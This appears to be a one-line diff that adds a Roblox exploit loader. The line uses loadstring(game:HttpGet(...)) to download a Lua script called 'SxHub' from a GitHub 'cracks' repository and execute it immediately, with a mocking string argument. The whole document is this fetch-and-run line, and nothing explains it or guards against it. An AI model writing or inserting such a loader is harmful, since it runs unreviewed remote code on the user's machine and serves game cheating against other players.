@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/cracklua/cracks/m/SxHub'))'25ms owns u'
